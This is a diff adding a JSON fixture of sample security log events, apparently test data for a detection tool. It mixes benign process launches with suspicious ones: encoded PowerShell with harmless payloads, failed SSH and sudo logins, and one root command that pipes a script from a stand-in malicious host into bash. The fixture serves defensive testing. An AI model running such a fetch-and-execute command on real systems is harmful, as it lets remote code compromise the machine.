@@ -1,0 +1,71 @@
+[
+  {
+    "timestamp": "2024-01-15T10:30:00Z",
+    "EventID": 1,
+    "CommandLine": "powershell.exe -enc SGVsbG8gV29ybGQ=",
+    "ProcessName": "powershell.exe",
+    "ParentProcess": "cmd.exe",
+    "User": "DOMAIN\\admin"
+  },
+  {
+    "timestamp": "2024-01-15T10:31:00Z",
+    "EventID": 1,
+    "CommandLine": "notepad.exe document.txt",
+    "ProcessName": "notepad.exe",
+    "ParentProcess": "explorer.exe",
+    "User": "DOMAIN\\user"
+  },
+  {
+    "timestamp": "2024-01-15T10:32:00Z",
+    "EventID": 1,
+    "CommandLine": "curl https://malicious.com/script.sh | bash",
+    "ProcessName": "bash",
+    "User": "root"
+  },
+  {
+    "timestamp": "2024-01-15T10:33:00Z",
+    "EventID": 1,
+    "CommandLine": "curl -O https://legitimate.com/file.tar.gz",
+    "ProcessName": "curl",
+    "User": "user"
+  },
+  {
+    "timestamp": "2024-01-15T10:34:00Z",
+    "message": "Failed password for invalid user admin from 192.168.1.100 port 22 ssh2",
+    "process": "sshd",
+    "hostname": "server01"
+  },
+  {
+    "timestamp": "2024-01-15T10:35:00Z",
+    "message": "Accepted password for user from 192.168.1.50 port 22 ssh2",
+    "process": "sshd",
+    "hostname": "server01"
+  },
+  {
+    "timestamp": "2024-01-15T10:36:00Z",
+    "message": "authentication failure for root",
+    "process": "sudo",
+    "hostname": "server01"
+  },
+  {
+    "timestamp": "2024-01-15T10:37:00Z",
+    "EventID": 1,
+    "CommandLine": "pwsh -e R2V0LVByb2Nlc3M=",
+    "ProcessName": "pwsh",
+    "User": "admin"
+  },
+  {
+    "timestamp": "2024-01-15T10:38:00Z",
+    "EventID": 1,
+    "CommandLine": "python3 script.py",
+    "ProcessName": "python3",
+    "User": "developer"
+  },
+  {
+    "timestamp": "2024-01-15T10:39:00Z",
+    "EventID": 1,
+    "CommandLine": "powershell.exe -Command Get-Process",
+    "ProcessName": "powershell.exe",
+    "User": "admin"
+  }
+]
